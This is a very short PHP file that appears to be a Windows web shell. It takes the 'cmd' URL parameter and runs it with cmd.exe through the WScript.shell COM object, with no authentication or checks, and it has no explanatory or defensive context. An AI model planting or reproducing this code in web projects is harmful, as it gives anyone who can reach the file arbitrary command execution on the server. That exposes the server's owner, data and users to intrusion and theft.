<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell');
$wsh->exec('cmd.exe /c '.$command);
?>